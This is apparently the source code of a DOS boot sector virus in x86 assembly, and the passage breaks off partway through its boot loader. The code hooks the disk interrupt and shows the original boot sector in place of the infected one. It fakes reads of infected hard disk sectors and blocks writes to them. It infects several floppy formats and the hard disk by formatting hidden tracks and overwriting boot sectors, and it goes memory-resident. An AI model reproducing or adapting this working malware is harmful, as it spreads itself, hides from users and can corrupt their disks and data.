;Basic Boot Sector Substitutor

COMSEG  SEGMENT PARA
        ASSUME  CS:COMSEG,DS:COMSEG,ES:COMSEG,SS:COMSEG

        ORG     100H

START:
        jmp     BOOT_START

;*******************************************************************************
;* BIOS DATA AREA                                                              *
;*******************************************************************************

        ORG     413H

MEMSIZE DW      640                             ;size of memory installed, in KB

;*******************************************************************************
;* VIRUS CODE STARTS HERE                                                      *
;*******************************************************************************

        ORG     5E00H

STEALTH:                                        ;A label for the beginning of the virus


;*******************************************************************************
;Format data consists of Track #, Head #, Sector # and Sector size code (2=512b)
;for every sector on the trcak.
FMT_12M:        ;Format data for Track 80, Head 1 on a 1.2 Meg High Density diskette, interleave 2
        DB      80,1,1,2,  80,1,9,2,  80,1,2,2,  80,1,10,2, 80,1,3,2
        DB      80,1,11,2, 80,1,4,2,  80,1,12,2, 80,1,5,2,  80,1,13,2
        DB      80,1,6,2, 80,1,14,2, 80,1,7,2, 80,1,15,2, 80,1,8,2

FMT_360_0:      ;Format data for Track 40, Head 0 on a 360K diskette, interleave 2
        DB      40,0,1,2,  40,0,6,2,  40,0,2,2,  40,0,7,2,  40,0,3,2
        DB      40,0,8,2,  40,0,4,2,  40,0,9,2,  40,0,5,2

FMT_360_1:      ;Format data for Track  40, Head 1 on a 360K diskette, interleave 2
        DB      40,1,1,2,  40,1,6,2,  40,1,2,2,  40,1,7,2,  40,1,3,2
        DB      40,1,8,2,  40,1,4,2,  40,1,9,2,  40,1,5,2


;*******************************************************************************
;* INTERRUPT 13H HANDLER                                                       *
;*******************************************************************************

OLD_13H DD      ?                               ;Old interrupt 13H vector goes here

INT_13H:
        sti
        cmp     ah,2                            ;we want to intercept reads
        jz      READ_FUNCTION
        cmp     ah,3                            ;and writes to all disks
        jz      WRITE_FUNCTION
I13R:   jmp     DWORD PTR cs:[OLD_13H]


;*******************************************************************************
;This section of code handles all attempts to access the Disk BIOS Function 2.
;It checks for several key situations where it must jump into action. They
;are:
;       1) If an attempt is made to read the boot sector, it must be processed
;          through READ_BOOT, so an infected boot sector is never seen.
;       2) If any of the infected sectors, Track 0, Head 0, Sector 2-16 on
;          drive C are read, they are processed by READ_HARD.
;       3) If an attempt is made to read Track 4, Head 0, Sector 1 on the
;          floppy, this routine checks to see if the floppy has already been
;          infected, and if not, it goes ahead and infects it.

READ_FUNCTION:                                  ;Disk Read Function Handler
        cmp     dh,0                            ;is it head 0?
        jnz     I13R                            ;nope, let BIOS handle it
    cmp ch,1                ;is it track 1?
    jz  RF0             ;yes, go do special processing
        cmp     ch,0                            ;is it track 0?
    jnz I13R                ;no, let BIOS handle it
        cmp     cl,1                            ;yes, is it sector 1
        jz      READ_BOOT                       ;yes, go handle boot sector read
        cmp     dl,80H                          ;is it a hard drive?
        jnc     RF1                             ;go check further
    jmp I13R

RF0:    cmp dl,80H              ;is it hard disk?
    jnc I13R                ;yes, let BIOS handle read
        cmp     cl,1                            ;no, floppy, is it sector 1?
        jnz     I13R                            ;no, let BIOS handle it
        call    CHECK_DISK                      ;is floppy already infected?
        jz      I13R                            ;yes so let BIOS handle it
        call    INFECT_FLOPPY                   ;no, go infect it
        jmp     SHORT I13R                      ;and then let BIOS do the read

RF1:    cmp     dl,80H                          ;is it hard drive c: ?
        jnz     I13R                            ;no, another hard drive
        cmp     cl,17                           ;sector < 17?
        jnc     I13R                            ;nope, let BIOS handle it
        jmp     READ_HARD                       ;divert read on the C drive


;*******************************************************************************
;This section of code handles all attempts to access the Disk BIOS Function 3.
;It checks for two key situations where it must jump into action. They are:
;
;       1) If an attempt is made to write the boot sector, it must be processed
;          through WRITE_BOOT, so an infected boot sector is never overwritten.
;       2) If any of the infected sectors, Track 0, Head 0, Sector 2-16 on
;          drive C are written, they are processed by WRITE_HARD.

WRITE_FUNCTION:                                 ;BIOS Disk Write Function
        cmp     dh,0                            ;is it head 0?
        jnz     I13R                            ;nope, let BIOS handle it
        cmp     ch,0                            ;is it track 0?
        jnz     I13R                            ;nope, let BIOS handle it
        cmp     cl,1                            ;is it sector 1
        jnz     WF1                             ;nope, check for hard drive
        jmp     WRITE_BOOT                      ;yes, go handle reading the boot sector
WF1:    cmp     dl,80H                          ;is it the hard drive c: ?
        jnz     I13R                            ;no, another hard drive
        cmp     cl,17                           ;sector < 17?
        jnc     I13R                            ;nope, let BIOS handle it
        jmp     WRITE_HARD                      ;else take care of writing to drive C


;*******************************************************************************
;This section of code handles reading the boot sector. There are three
;possibilities: 1) The disk is not infected, in which case the read should be
;passed directly to BIOS, 2) The disk is infected and only one sector is
;requested, in which case this routine figures out where the original boot
;sector is and reads it, and 3) The disk is infected and more than one sector
;is requested, in which case this routine breaks the read up into two calls to the
;ROM BIOS, one to fetch the original boot sector, and another to fetch the
;additional sectors being read. One of the complexities in this last case is
;that the routine must return the registers set up as if only one read had
;been performed.
;  To determine if the disk is infected, the routine reads the real boot sector
;into SCRATCHBUF and calls IS_VBS. If that returns affirmative (Z set), then this
;routine goes to get the original boot sector, etc., otherwise it calls ROM
;BIOS and allows a second read to take place to get the boot sector into the
;requested buffer at es:bx.

READ_BOOT:
        push    ax                              ;save registers
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    bp

        push    cs                              ;set ds=es=cs
        pop     es
        push    cs
        pop     ds
        mov     bp,sp                           ;and bp=sp

RB001:  mov     al,dl
        call    GET_BOOT_SEC                    ;read the real boot sector
        call    GET_BOOT_SEC                    ;read the real boot sector
        sti
        jnc     RB01
        jmp     RB_GOON                         ;error on read here, let ROM BIOS return proper error code
RB01:   call    IS_VBS                          ;good read, is it the viral boot sector?
        jz      RB02                            ;yes
        jmp     RB_GOON                         ;no, just go let ROM BIOS read sector
RB02:   mov     bx,OFFSET SCRATCHBUF + (OFFSET DR_FLAG - OFFSET BOOT_START)
        mov     al,BYTE PTR [bx]
        cmp     al,80H                          ;infected, so we must redirect the read
        jnz     RB1
        mov     al,4                            ;make an index of the drive type being read
RB1:    mov     bl,3
        mul     bl                              ;ax=offset to BOOT_SECTOR_LOCATION table
        add     ax,OFFSET BOOT_SECTOR_LOCATION
        mov     bx,ax
        mov     ch,[bx]
        mov     dh,[bx+1]
        mov     cl,[bx+2]                       ;set up everything for the read
        mov     dl,ss:[bp+6]
        mov     bx,ss:[bp+10]
        mov     ax,ss:[bp+2]
        mov     es,ax
        mov     ax,201H
        mov     al,ss:[bp+12]
        pushf
        call    DWORD PTR [OLD_13H]
        sti
        mov     al,ss:[bp+12]                   ;see if it was a more than 1 sector read
        cmp     al,1
        jz      RB_EXIT

READ_1NEXT:                                     ;more than 1 sector, read the rest now
        pop     bp                              ;as a second call to BIOS
        pop     es
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        add     bx,512                          ;prepare to call old handler for balance of read
        push    ax
        dec     al
        inc     cl

        cmp     dl,80H                          ;is it the hard drive
        jnz     RB15                            ;nope, go handle floppy

        push    bx                              ;handle an infected hard drive
        push    cx                              ;by faking the read on extra sectors
        push    dx                              ;and returning a block of F6's
        push    si
        push    di
        push    ds
        push    bp

        push    es
        pop     ds                              ;ds=es

        mov     BYTE PTR [bx],0                 ;set first byte in buffer
        mov     si,bx
        mov     di,bx
        inc     di
        mov     ah,0                            ;ax=number of sectors to read now
        mov     bx,512                          ;bytes per sector
        mul     bx                              ;number of bytes to read in dx:ax, better be < 64k
        mov     cx,ax
        dec     cx                              ;number of bytes to move
        rep     movsb                           ;fill buffer with F6's

        clc                                     ;clear carry
        pushf                                   ;then restore everyting properly
        pop     ax
        mov     ss:[bp+20],ax
        pop     bp
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        mov     ah,0
        dec     cl
        sub     bx,512
        iret                                    ;and get out

RB15:                                           ;read next sectors on floppy drive
        pushf
        call    DWORD PTR cs:[OLD_13H]          ;read the rest (must use cs now!)
        sti
        push    ax
        push    bp
        mov     bp,sp
        pushf
        pop     ax
        mov     ss:[bp+10],ax
        jc      RB2                             ;an error, so exit with ah from 2nd int 13

RB17:
        sub     bx,512
        dec     cl
        pop     bp
        pop     ax
        pop     ax                              ;else exit with ah from first int 13
        mov     ah,0
        iret

RB2:    pop     bp
        pop     ax
        add     sp,2
        iret

RB_EXIT:
        mov     ax,ss:[bp+18]
        push    ax
        popf
        clc
        pushf
        pop     ax
        mov     ss:[bp+18],ax
        pop     bp
        pop     es
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        mov     ah,0
        iret

RB_GOON:                        ;This just restores all registers as they were
        pop     bp              ;when INT_13H was reached, and passes control
        pop     es              ;to the ROM BIOS
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        jmp     I13R


;*******************************************************************************
;This routine handles writing the boot sector for all disks. It checks to see
;if the disk has been infected, and if not, allows BIOS to handle the write.
;If the disk is infected, this routine redirects the write to put the boot
;sector being written in the reserved area for the original boot sector. It
;must also handle the writing of multiple sectors properly.
WRITE_BOOT:
        push    ax
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    bp
        mov     bp,sp

        push    cs                              ;ds=es=cs
        pop     ds
        push    cs
        pop     es

        mov     al,dl
        call    GET_BOOT_SEC
        call    GET_BOOT_SEC                    ;read the real boot sector
        sti
        jnc     WB01
        jmp     WB_GOON                         ;error on read here, go handle it
WB01:   call    IS_VBS                          ;good read, is it the viral boot sector?
        jz      WB02                            ;yes
        jmp     WB_GOON                         ;no, just go let ROM BIOS write sector
WB02:   mov     bx,OFFSET SCRATCHBUF + (OFFSET DR_FLAG - OFFSET BOOT_START)
        mov     al,BYTE PTR [bx]
        cmp     al,80H                          ;infected, so we must redirect the write
        jnz     WB1
        mov     al,4                            ;make an index of the drive type being write
WB1:    mov     bl,3
        mul     bl                              ;ax=offset to BOOT_SECTOR_LOCATION table
        add     ax,OFFSET BOOT_SECTOR_LOCATION
        mov     bx,ax
        mov     ch,[bx]
        mov     dh,[bx+1]
        mov     cl,[bx+2]                       ;set up everything for the write
        mov     dl,ss:[bp+6]
        mov     bx,ss:[bp+10]
        mov     ax,ss:[bp+2]
        mov     es,ax
        mov     ax,301H
        mov     al,ss:[bp+12]
        pushf
        call    DWORD PTR [OLD_13H]
        sti
    mov dl,ss:[bp+6]
    cmp dl,80H              ;was boot sector going to hard drive?
    jnz WB_15               ;no
    mov [DR_FLAG],80H           ;yes, update partition info
    push    si
    push    di
    mov di,OFFSET PART
    mov si,ss:[bp+10]
    add si,OFFSET PART - OFFSET BOOT_START
    push    es
    pop ds
    push    cs
    pop es              ;switch ds and es around
    mov cx,20
    rep movsw               ;and move partition data to viral boot record
    push    cs
    pop ds
    mov ax,301H
    mov bx,OFFSET BOOT_START
    mov cx,1                ;Track 0, Sector 1
    mov dx,80H              ;drive 80H, Head 0
    pushf
    call    DWORD PTR [OLD_13H]     ;go write updated boot sector
    
    pop di
    pop si
WB_15:  mov     al,ss:[bp+12]
        cmp     al,1
        jz      WB_EXIT                         ;see if it was a more than 1 sector write

WRITE_1NEXT:                                    ;more than 1 sector
        mov     dl,ss:[bp+6]                    ;see if it's the hard drive
        cmp     dl,80H
        jz      WB_EXIT                         ;if so, ignore write to other sectors
        pop     bp                              ;floppy drive, write the rest now
        pop     es                              ;as a second call to BIOS
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        add     bx,512                          ;prepare to call old handler for balance of read
        push    ax
        dec     al
        inc     cl
        pushf
        call    DWORD PTR cs:[OLD_13H]          ;read the rest (must use cs now!)
        sti
        push    ax
        push    bp
        mov     bp,sp
        pushf
        pop     ax
        mov     ss:[bp+10],ax
        jc      WB2                             ;an error, so exit with ah from 2nd int 13

        sub     bx,512
        dec     cl
        pop     bp
        pop     ax
        pop     ax                              ;else exit with ah=0
        mov     ah,0
        iret

WB2:    pop     bp
        pop     ax
        add     sp,2
        iret


WB_EXIT:
        mov     ax,ss:[bp+18]                   ;set carry on stack to indicate
        push    ax                              ;a successful write operation
        popf
        clc
        pushf
        pop     ax
        mov     ss:[bp+18],ax
        pop     bp                              ;restore all registers and exit
        pop     es
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        mov     ah,0
        iret

WB_GOON:                        ;This just restores all registers as they were
        pop     bp              ;when INT_13H was reached, and passes control
        pop     es              ;to the ROM BIOS
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        jmp     I13R


;*******************************************************************************
;Read hard disk sectors on Track 0, Head 0. If the hard disk is infected,
;then instead of reading the true data there, return a block of 0's, since
;0 is the data stored in a freshly formatted but unused sector. This will
;fake the caller out and keep him from knowing that the virus is hiding there.
;If the disk is not infected, return the true data stored in those sectors.
READ_HARD:
        call    CHECK_DISK                      ;see if disk is infected
        jnz     RH_EX                           ;no, let BIOS handle the read
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    bp
        mov     bp,sp
        mov     BYTE PTR es:[bx],0
        push    es
        pop     ds
        mov     si,bx
        mov     di,bx
        inc     di
        mov     ah,0                            ;ax=number of sectors to read now
        mov     bx,512                          ;bytes per sector
        mul     bx                              ;number of bytes to read in dx:ax, better be < 64k
        mov     cx,ax
        dec     cx                              ;number of bytes to move
        rep     movsb                           ;to give a fake read of all F6's

        mov     ax,ss:[bp+20]                   ;now set c flag to successful
        push    ax
        popf
        clc
        pushf
        pop     ax
        mov     ss:[bp+20],ax

        pop     bp                              ;restore everything and exit
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        mov     ah,0
        iret

RH_EX:  jmp     I13R

;*******************************************************************************
;Handle writes to hard disk sectors 2 - 16 on Track 0, Head 0. We must modify
;the read if the disk is infected. This is very simple: just don't allow the
;writes to take place. Instead, fake the return of an error by setting carry
;and returning ah=4 (sector not found).
WRITE_HARD:
        call    CHECK_DISK                      ;see if the disk is infected
        jnz     WH_EX                           ;no, let BIOS handle it all
        push    bp
        push    ax
        mov     bp,sp
        mov     ax,ss:[bp+8]                    ;get flags off of stack
        push    ax
        popf                                    ;put them in current flags
        stc                                     ;set the carry flag
        pushf
        pop     ax
        mov     ss:[bp+8],ax                    ;and put flags back on stack
        pop     ax
        mov     ah,4                            ;set up sector not found error
        pop     bp
        iret                                    ;and get out of ISR

WH_EX:  jmp     I13R


;This table identifies where the original boot sector is located for each
;of the various disk types.
BOOT_SECTOR_LOCATION:
        DB      40,1,6                          ;Track, head, sector for orig boot sector, 360k drive
        DB      80,1,15                         ;1.2M drive
        DB      79,1,9                          ;720K drive
        DB      79,1,18                         ;1.44M drive
        DB      0,0,16                          ;Hard drive


;See if disk dl is infected already. If so, return with Z set. This
;does not assume that registers have been saved.
CHECK_DISK:
        push    ax
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    cs
        pop     ds
        push    cs
        pop     es
        mov     al,dl
        call    GET_BOOT_SEC
    jnc CD1
    xor al,al               ;fake as if infected
    jmp SHORT CD2           ;in the event of an error
CD1:    call    IS_VBS                          ;see if viral boot sector
CD2:    pop     es
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        ret

;*******************************************************************************
;This routine determines from the boot sector parameters what kind of floppy
;disk is in the drive being accessed, and calls the proper infection routine.
INFECT_FLOPPY:
    pushf
        push    si
        push    di
        push    ax
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    cs
        pop     es
        push    cs
        pop     ds
        sti
        mov     bx,OFFSET SCRATCHBUF + 13H      ;address of sector count in boot sector
        mov     bx,[bx]                         ;get sector count for this disk
        mov     al,dl
        cmp     bx,720                          ;is it 360K?
        jnz     IF_1
        call    INFECT_360K                     ;yes, infect it
        jmp     SHORT IF_R
IF_1:   cmp     bx,2400                         ;is it 1.2M?
        jnz     IF_2
        call    INFECT_12M                      ;yes, infect it
        jmp     SHORT IF_R
IF_2:   cmp bx,1440             ;is it 720K 3 1/2"?
    jnz IF_3
    call    INFECT_720K         ;yes, infect it
    jmp SHORT IF_R
IF_3:   cmp bx,2880             ;is it 1.44M 3 1/2"?
    jnz IF_R                ;no - don't infect this disk
    call    INFECT_144M         ;yes - infect it
IF_R:   pop     es
        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        pop     di
        pop     si
    popf
        ret


;*******************************************************************************
INFECT_360K:
        call    FORMAT_360                      ;format the required sectors
        jc      INF360_EXIT

        mov     bx,OFFSET SCRATCHBUF            ;and go write it at Track 40, Head 1, Sector 6
        push    ax
        mov     dl,al
        mov     dh,1                            ;head 1
        mov     cx,2806H                        ;track 40, sector 6
        mov     ax,0301H                        ;BIOS write, for 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        jc      INF360_EXIT

        mov     di,OFFSET BOOT_DATA
        mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)
        mov     cx,1BH / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new boot sector
        mov     al,BYTE PTR [SCRATCHBUF + 1FDH] ;copy drive letter there as well
        mov     BYTE PTR [BOOT_START + 1FDH],al
        mov     [DR_FLAG],0                     ;set proper drive type

        push    ax                              ;and write new boot sector to disk
        mov     bx,OFFSET BOOT_START            ;this is buffer for the new boot sector
        call    PUT_BOOT_SEC                    ;go write it to disk
        pop     ax
        jc      INF360_EXIT

        mov     bx,OFFSET STEALTH               ;buffer for 9 sectors of stealth routines
        mov     dl,al                           ;drive to write to
        mov     dh,0                            ;head 0
        mov     cx,2801H                        ;track 40, sector 1
        mov     ax,0309H                        ;write 9 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        jc      INF360_EXIT

        add     bx,9*512                        ;do remaining 5 sectors now
        mov     dl,al                           ;drive to write to
        mov     dh,1                            ;head 1
        mov     cx,2801H                        ;track 40, sector 1
        mov     ax,0305H                        ;write 5 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
INF360_EXIT:
        ret                                     ;all done


;Format Track 40, Head 0 and 1 so we can infect a 360k diskette.
FORMAT_360:
        push    ax
        mov     dl,al
        mov     dh,0                            ;head 0
        mov     cx,2801H                        ;track 40, start at sector 1
        mov     ax,0509H                        ;format 9 sectors
        mov     bx,OFFSET FMT_360_0             ;format info for this sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        push    ax
        mov     dl,al
        mov     dh,1                            ;head 1
        mov     cx,2801H                        ;track 40, start at sector 1
        mov     ax,0509H                        ;format 9 sectors
        mov     bx,OFFSET FMT_360_1             ;format info for this sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        ret


;*******************************************************************************
;Infect Floppy Disk Drive AL with this virus. This involves the following steps:
;A) Read the present boot sector. B) Copy it to Track 80, Head 1, Sector 15.
;C) Copy the disk parameter info into the new boot sector in memory. D) Copy the
;new boot sector to Track 0, Head 0, Sector 1. E) Copy the STEALTH routines to
;Track 79, Head 1, Sector 1, 14 sectors total.
INFECT_12M:
        call    ADJUST_DBT                      ;set up Disk Base Table for 15 sec format
        call    FORMAT_12M
        jc      INF12M_EXIT

        mov     bx,OFFSET SCRATCHBUF            ;and go write it at Track 80, Head 1, Sector 15
        push    ax
        mov     dl,al
        mov     dh,1                            ;head 1
        mov     cx,500FH                        ;track 80, sector 15
        mov     ax,0301H                        ;BIOS write, for 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        jc      INF12M_EXIT

        mov     di,OFFSET BOOT_DATA
        mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)
        mov     cx,1BH / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new boot sector
        mov     al,BYTE PTR [SCRATCHBUF + 1FDH] ;copy drive letter there as well
        mov     BYTE PTR [BOOT_START + 1FDH],al
        mov     [DR_FLAG],1                     ;set proper diskette type

        push    ax                              ;and write new boot sector to disk
        mov     bx,OFFSET BOOT_START            ;this is buffer for the new boot sector
        call    PUT_BOOT_SEC                    ;go write it to disk
        pop     ax
        jc      INF12M_EXIT

        mov     bx,OFFSET STEALTH               ;buffer for 14 sectors of stealth routines
        mov     dl,al                           ;drive to write to
        mov     dh,1                            ;head 1
        mov     cx,5001H                        ;track 80, sector 1
        mov     ax,030EH                        ;write 14 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
INF12M_EXIT:
        call    RESET_DBT                       ;reset the Disk Base Table to original
        ret                                     ;all done

;Format Track 80, Head 1 so we can infect a 1.2 Meg diskette.
FORMAT_12M:
        push    ax
        mov     dl,al
        mov     dh,1                            ;head 1
        mov     cx,5001H                        ;track 80, start at sector 1
        mov     ax,050FH                        ;format 15 sectors
        mov     bx,OFFSET FMT_12M               ;format info for this sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        ret


;*******************************************************************************
INFECT_720K:
        mov     bx,OFFSET SCRATCHBUF            ;go write boot sec at Track 79, Head 1, Sector 9
        push    ax
        mov     dl,al
        mov     dh,1                            ;head 1
        mov     cx,4F09H                        ;track 79, sector 9
        mov     ax,0301H                        ;BIOS write, for 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        jc      INF720K_EXIT

        mov     di,OFFSET BOOT_DATA
        mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)
        mov     cx,1BH / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new boot sector
        mov     al,BYTE PTR [SCRATCHBUF + 1FDH] ;copy drive letter there as well
        mov     BYTE PTR [BOOT_START + 1FDH],al
        mov     [DR_FLAG],2                     ;set proper diskette type

        push    ax                              ;and write new boot sector to disk
        mov     bx,OFFSET BOOT_START            ;this is buffer for the new boot sector
        call    PUT_BOOT_SEC                    ;go write it to disk
        pop     ax
        jc      INF720K_EXIT

        mov     bx,OFFSET STEALTH               ;buffer for 14 sectors of stealth routines
        mov     dl,al                           ;drive to write to
        mov     dh,0                            ;head 0
        mov     cx,4F04H                        ;track 79, sector 4
        mov     ax,0306H                        ;write 6 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
    jc  INF720K_EXIT

        mov     bx,OFFSET STEALTH + 6*512       ;buffer for 8 more sectors of stealth routines
        mov     dl,al                           ;drive to write to
        mov     dh,1                            ;head 1
        mov     cx,4F01H                        ;track 79, sector 1
        mov     ax,0308H                        ;write 8 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)

INF720K_EXIT:
        ret                                     ;all done


;*******************************************************************************
INFECT_144M:
        mov     bx,OFFSET SCRATCHBUF            ;go write boot sec at Track 79, Head 1, Sector 18
        push    ax
        mov     dl,al
        mov     dh,1                            ;head 1
        mov     cx,4F12H                        ;track 79, sector 18
        mov     ax,0301H                        ;BIOS write, for 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        jc      INF144M_EXIT

        mov     di,OFFSET BOOT_DATA
        mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)
        mov     cx,1BH / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new boot sector
        mov     al,BYTE PTR [SCRATCHBUF + 1FDH] ;copy drive letter there as well
        mov     BYTE PTR [BOOT_START + 1FDH],al
        mov     [DR_FLAG],3                     ;set proper diskette type

        push    ax                              ;and write new boot sector to disk
        mov     bx,OFFSET BOOT_START            ;this is buffer for the new boot sector
        call    PUT_BOOT_SEC                    ;go write it to disk
        pop     ax
        jc      INF144M_EXIT

        mov     bx,OFFSET STEALTH               ;buffer for 14 sectors of stealth routines
        mov     dl,al                           ;drive to write to
        mov     dh,1                            ;head 1
        mov     cx,4F04H                        ;track 79, sector 4
        mov     ax,030EH                        ;write 14 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)

INF144M_EXIT:
        ret                                     ;all done



;*******************************************************************************
;Infect Hard Disk Drive AL with this virus. This involves the following steps:
;A) Read the present boot sector. B) Copy it to Track 0, Head 0, Sector 16.
;C) Copy the disk parameter info into the new boot sector in memory. D) Copy the
;new boot sector to Track 0, Head 0, Sector 1. E) Copy the STEALTH routines to
;Track 0, Head 0, Sector 2, 14 sectors total.
INFECT_HARD:
        mov     al,80H                          ;set drive type flag to hard disk
        mov     [DR_FLAG],al                    ;cause that's where it's going

        call    GET_BOOT_SEC                    ;read the present boot sector into RAN

        mov     bx,OFFSET SCRATCHBUF            ;and go write it at Track 0, Head 0, Sector 16
        push    ax
        mov     dl,al
        mov     dh,0                            ;head 0
        mov     cx,0010H                        ;track 0, sector 16
        mov     ax,0301H                        ;BIOS write, for 1 sector
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax

        push    ax
        mov     di,OFFSET BOOT_DATA
        mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT_DATA - OFFSET BOOT_START)
        mov     cx,1BH / 2                      ;copy boot sector disk info over
        rep     movsw                           ;to new boot sector
        mov     di,OFFSET BOOT_START + 200H - 42H
        mov     si,OFFSET SCRATCHBUF + 200H - 42H
        mov     cx,21H                          ;copy partition table
        rep     movsw                           ;to new boot sector too!
        pop     ax

        push    ax                              ;and write new boot sector to disk
        mov     bx,OFFSET BOOT_START            ;this is buffer for the new boot sector
        call    PUT_BOOT_SEC
        pop     ax

        mov     bx,OFFSET STEALTH               ;buffer for 14 sectors of virus routines
        mov     dl,al                           ;drive to write to
        mov     dh,0                            ;head 0
        mov     cx,0002H                        ;track 0, sector 2
        mov     ax,030EH                        ;write 14 sectors
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)

        ret


;*******************************************************************************
;This routine determines if a hard drive C: exists, and returns NZ if it does,
;Z if it does not.
IS_HARD_THERE:
        mov     al,1
        or      al,al
        ret

;Read the boot sector on the drive AL into SCRATCHBUF. This routine must
;prserve AL!
GET_BOOT_SEC:
        push    ax
        mov     bx,OFFSET SCRATCHBUF            ;this is buffer for the current boot sector
        mov     dl,al                           ;this is the drive to read from
        mov     dh,0                            ;head 0
        mov     ch,0                            ;track 0
        mov     cl,1                            ;sector 1
        mov     al,1                            ;read 1 sector
        mov     ah,2                            ;BIOS read function
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        pop     ax
        ret


;This routine writes the boot sector at es:bx to the drive in al.
PUT_BOOT_SEC:
        mov     dl,al                           ;this is the drive to write to
        mov     dh,0                            ;head 0
        mov     ch,0                            ;track 0
        mov     cl,1                            ;sector 1
        mov     al,1                            ;read 1 sector
        mov     ah,3                            ;BIOS write function
        pushf
        call    DWORD PTR [OLD_13H]             ;(int 13H)
        ret

;Determine whether the boot sector in SCRATCHBUF is the viral boot sector.
;Returns Z if it is, NZ if not. The first 30 bytes of code, starting at BOOT,
;are checked to see if they are identical. If so, it must be the viral boot
;sector. It is assumed that es and ds are properly set to this segment when
;this is called.
IS_VBS:
        push    si
        push    di
        cld
        mov     di,OFFSET BOOT
        mov     si,OFFSET SCRATCHBUF + (OFFSET BOOT - OFFSET BOOT_START)
        mov     cx,15
        repz    cmpsw
        pop     di
        pop     si
        ret

DBT_TEMP    DB  0

;Set the DBT up to handle a 1.2 Meg floppy disk drive, with 15 sectors per
;track.
ADJUST_DBT:
        push    es
        push    ax
        xor     ax,ax
        mov     es,ax
        mov     bx,78H
        les     bx,es:[bx]
    mov al,BYTE PTR es:[bx+4]
    mov [DBT_TEMP],al
        mov     BYTE PTR es:[bx+4],0FH
        pop     ax
        pop     es
        ret

;Restore the DBT to 9 sectors per track, which is the default value stored there.
RESET_DBT:
        push    es
        push    ax
        xor     ax,ax
        mov     es,ax
        mov     bx,78H
        les     bx,es:[bx]
    mov al,[DBT_TEMP]
        mov     BYTE PTR es:[bx+4],al
        pop     ax
        pop     es
        ret



;*******************************************************************************
;* A SCRATCH PAD BUFFER FOR DISK READS AND WRITES
;*******************************************************************************

        ORG     7A00H

SCRATCHBUF:

        DB      512 dup (?)

;*******************************************************************************
;* THIS IS THE REPLACEMENT BOOT SECTOR                                         *
;*******************************************************************************

        ORG     7C00H

BOOT_START:
        jmp     SHORT BOOT                      ;jump over data area
        db      0FFH                            ;an extra byte for near jump

BOOT_DATA:
        db      1BH dup (?)                     ;data area (will be copied from old sector)

DR_FLAG DB      1                               ;Drive type flag, 0=360K Floppy
                                                ;                 1=1.2M Floppy
                                                ;                 2=720K Floppy
                                                ;                 3=1.4M Floppy
                                                ;                 80H=Hard Disk

BOOT:
        cli
        xor     ax,ax
        mov     ss,ax
        mov     ds,ax
        mov     es,ax                           ;set up segment registers
        mov     sp,OFFSET BOOT_START            ;and stack pointer
        sti

        mov     ax,[MEMSIZE]                    ;get the size of memory available in this system
        mov     cl,6
        shl     ax,cl                           ;this turns KB into a segment value
        sub     ax,2A0H+5E0H                    ;subtract enough so this code will have the right offset
        mov     es,ax                           ;and so we don't cross a DMA bdy formatting a 1.2 M diskette
        sub     [MEMSIZE],11                    ;go memory resident in high memory

GO_RELOC:
        mov     si,OFFSET BOOT_START            ;set up ds:si and es:di in order to relocate this code
        mov     di,si
        mov     cx,256
        rep     movsw                           ;and move this sector to BOOT_START
        push    es
        mov     ax,OFFSET RELOC
        push    ax                              ;push relocated address of RELOC onto stack
        retf                                    ;and go there

RELOC:                                          ;relocated code begins executing here
        push    es
        pop     ds
        mov     bx,OFFSET STEALTH               ;set up buffer to read virus into memory
        mov     al,[DR_FLAG]                    ;drive number
        cmp     al,0                            ;Load from proper drive type
        jz      LOAD_360
        cmp     al,1
        jz      LOAD_12M
        cmp     al,2
        jz      LOAD_720
        cmp     al,3
        jz      LOAD_14M
                                                ;if none of the above, then it's a hard drive

LOAD_HARD:                                      ;load virus from hard disk
        mov     dx,80H                          ;hard drive 80H, head 0,
